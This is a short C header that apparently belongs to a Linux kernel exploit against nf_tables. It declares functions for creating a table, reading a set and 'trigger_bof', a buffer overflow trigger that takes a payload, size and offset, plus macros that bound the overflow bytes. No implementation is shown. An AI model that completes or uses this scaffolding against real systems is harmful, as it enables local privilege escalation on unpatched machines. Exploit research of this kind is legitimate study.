#ifndef _NF_TABLES_H_
#define _NF_TABLES_H_

#include <stdint.h>

#include "netlink.h"

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)

#define BOF_MAX_BYTE_VALUE ((NFT_REG32_COUNT << 2) | 0b11)
#define MAX_PAYLOAD_SIZE(x) (UCHAR_MAX - x)

void create_table(int sock, const char *name);
void trigger_bof(int sock, const uint8_t *payload, uint8_t payload_size, uint8_t payload_start_offset, const char *set_name, const char *table_name, uint32_t id);
void get_set(int sock, const char *table_name, const char *set_name);


#endif /* _NF_TABLES_H_ */
